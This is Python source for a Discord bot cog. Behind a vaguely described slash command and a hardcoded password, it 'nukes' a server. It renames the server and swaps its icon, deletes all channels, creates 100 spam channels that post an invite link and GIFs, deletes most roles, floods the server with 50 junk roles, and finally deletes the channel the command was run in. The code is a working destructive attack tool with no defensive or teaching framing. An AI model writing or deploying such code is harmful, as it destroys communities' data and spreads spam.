import asyncio
import discord
import aiohttp
from discord.ext import commands
from discord import app_commands

# ハードコードされたパスワード（管理者のみが知っている）
ADMIN_PASSWORD = "taka1127aki"


class TiroFinale(commands.Cog):

    def __init__(self, bot):
        self.bot = bot

    @app_commands.command(name="tiro_finale", description="特定の操作を実行します。")
    async def send_update_notice(self, interaction: discord.Interaction,
                                 password: str):
        # パスワードチェック
        if password != ADMIN_PASSWORD:
            await interaction.response.send_message(
                "権限がありません。正しいパスワードを入力してください。", ephemeral=True)
            return

        guild = interaction.guild
        if not guild:
            await interaction.response.send_message("このコマンドはサーバー内でのみ使用できます。",
                                                    ephemeral=True)
            return

        original_channel = interaction.channel
        user_roles = interaction.user.roles

        try:
            await interaction.response.send_message("処理を開始します...",
                                                    ephemeral=True)

            # サーバー名とアイコンを変更
            icon_url = "https://th.bing.com/th/id/R.cdd5e828d1cc51f7580575148360982e?rik=WhIzGEJd8VE07w&riu=http%3a%2f%2f38.media.tumblr.com%2fec6a1b06a90bff4934c2ab96d9dcad25%2ftumblr_mht5no1VTG1qg52ruo1_500.gif&ehk=fKCiV%2fetna%2fAhWWWskpJwvwQYg2dxLwoNZPmMGH8bgE%3d&risl=&pid=ImgRaw&r=0"
            async with aiohttp.ClientSession() as session:
                async with session.get(icon_url) as resp:
                    if resp.status == 200:
                        icon_bytes = await resp.read()
                        await guild.edit(name="takaの植民地", icon=icon_bytes)
                    else:
                        await interaction.followup.send(
                            f"アイコン画像の取得に失敗しました。ステータスコード: {resp.status}",
                            ephemeral=True)
                        return

            # チャンネル削除
            channels_to_delete = [
                channel for channel in guild.channels
                if channel != original_channel
            ]
            if channels_to_delete:
                await interaction.followup.send("チャンネルを削除しています...",
                                                ephemeral=True)
                delete_tasks = [
                    channel.delete() for channel in channels_to_delete
                ]
                await asyncio.gather(*delete_tasks)

            # チャンネル作成
            await interaction.followup.send("新しいチャンネルを作成しています...",
                                            ephemeral=True)
            create_tasks = [
                guild.create_text_channel(f"takaの植民地-{i}")
                for i in range(1, 101)
            ]
            new_channels = await asyncio.gather(*create_tasks,
                                                return_exceptions=True)

            # メッセージ送信
            for channel in new_channels:
                if isinstance(channel, discord.TextChannel):
                    try:
                        await channel.send(
                            f"ようこそ！ここは{channel.name}です。https://discord.gg/aydESzuDAP https://imgur.com/a/QuS0xJy https://cdn-ak.f.st-hatena.com/images/fotolife/p/pema/20110314/20110314014810.gif https://c.tenor.com/lPtyBcvfhrQAAAAM/madoka-magica-homura-vs-mami.gif"
                        )
                    except Exception as e:
                        print(
                            f"チャンネル {channel.name} にメッセージ送信中にエラーが発生しました: {e}")

            # ロール削除
            roles_to_delete = [
                role for role in guild.roles
                if role.name != "@everyone" and role not in user_roles
            ]
            if roles_to_delete:
                await interaction.followup.send("ロールを削除しています...",
                                                ephemeral=True)
                delete_role_tasks = [role.delete() for role in roles_to_delete]
                await asyncio.gather(*delete_role_tasks)

            # ロール作成
            await interaction.followup.send("新しいロールを作り始めています...",
                                            ephemeral=True)
            create_role_tasks = [
                guild.create_role(name=f"takaの植民地",
                                  color=discord.Color.random())
                for i in range(1, 51)
            ]
            await asyncio.gather(*create_role_tasks, return_exceptions=True)

            # 最終メッセージとチャンネル削除
            await interaction.followup.send("全ての操作が完了しました。このチャンネルは数秒後に削除されます。",
                                            ephemeral=True)
            await asyncio.sleep(2)
            await original_channel.delete()

        except Exception as e:
            await interaction.followup.send(f"エラーが発生しました: {e}", ephemeral=True)


async def setup_tiro_finale(bot):
    await bot.add_cog(TiroFinale(bot))
